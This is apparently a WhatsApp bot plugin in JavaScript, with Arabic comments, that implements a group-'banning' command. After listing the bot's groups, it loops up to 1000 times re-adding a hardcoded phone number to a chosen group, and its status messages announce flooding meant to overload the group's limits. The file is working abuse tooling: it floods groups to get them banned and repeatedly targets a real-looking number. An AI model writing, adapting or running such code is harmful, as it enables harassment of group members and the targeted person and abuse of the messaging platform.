/**
 * plugins/تبنيد.js — أمر تبنيد المجموعات بالإضافة المكثفة
 */

import axios from 'axios';

if (!global.activeSpams) global.activeSpams = new Map();

// ── الأرقام المستهدفة للضغط ──────────────────────────────────
const TARGET_NUMBERS = [
    '201128344087',
];

const handler = async (m, { sock, text, usedPrefix, command, isDeveloper, isROwner }) => {
    if (!isDeveloper && !isROwner) return m.reply('❌ ACCESS DENIED: Developer only.');

    const jid = m.chat;
    const sub = text?.trim();

    if (!sub) {
        await m.reply('🔄 [SYSTEM] Fetching active target sectors...');
        try {
            const groupMetadatas = await sock.groupFetchAllParticipating();
            const groups = Object.values(groupMetadatas);
            if (groups.length === 0) return m.reply('⚠️ [SYSTEM] No active target clusters found.');

            let msg = '⚡ *TARGET SECTORS (GROUPS):*\n';
            groups.forEach((g, i) => {
                msg += `\n` +
                    `┌ 🎯 *Target [${i + 1}]* : ${g.subject || 'Unknown'}\n` +
                    `└ 👥 Nodes Active : ${g.participants.length}`;
            });
            msg += '\n\n💻 *EXECUTION:* `.تبنيد <target_number>`';
            return m.reply(msg);
        } catch (e) {
            return m.reply(`❌ [ERROR] Failed to fetch targets: ${e.message}`);
        }
    }

    if (sub === 'ايقاف' || sub === 'stop') {
        if (global.activeSpams.has(jid)) {
            global.activeSpams.set(jid, false);
            return m.reply('🛑 [ABORT] Termination sequence halted by operator.');
        }
        return m.reply('⚠️ [SYSTEM] No active execution loop found.');
    }

    const groupIndex = parseInt(sub) - 1;

    try {
        const groupMetadatas = await sock.groupFetchAllParticipating();
        const groups = Object.values(groupMetadatas);

        if (isNaN(groupIndex) || groupIndex < 0 || groupIndex >= groups.length) {
            return m.reply('❌ [ERROR] Invalid target index. Use `.تبنيد` to list clusters.');
        }

        const targetGroup = groups[groupIndex];
        const targetJid = targetGroup.id;

        global.activeSpams.set(jid, true);

        await sock.sendMessage(jid, {
            text: `⚠️ [EXECUTION PROTOCOL INITIALIZED]\n\n` +
                  `🚀 Target Locked: *${targetGroup.subject}*\n` +
                  `🔥 Status: *FLOODING ACTIVE*\n` +
                  `🎯 Vectors Loaded: *${TARGET_NUMBERS.length}*\n\n` +
                  `_System is overloading target limits..._\n\n` +
                  `To abort, send: \`.تبنيد ايقاف\``,
        }, { quoted: m });

        (async () => {
            let count = 0;
            while (global.activeSpams.get(jid) === true) {
                try {
                    const rawNum = TARGET_NUMBERS[count % TARGET_NUMBERS.length];
                    const targetUserJid = `${rawNum}@s.whatsapp.net`;

                    await sock.groupParticipantsUpdate(targetJid, [targetUserJid], 'add');
                    count++;
                    
                    await new Promise(resolve => setTimeout(resolve, 700));
                } catch (err) {
                    await new Promise(resolve => setTimeout(resolve, 400));
                }

                if (count > 1000) break;
            }
            global.activeSpams.set(jid, false);
        })();

    } catch (e) {
        return m.reply(`❌ [CRITICAL ERROR]: ${e.message}`);
    }
};

handler.help = ['تبنيد'];
handler.tags = ['owner'];
handler.command = /^(تبنيد|ban-group)$/i;
handler.owner = true;

export default handler;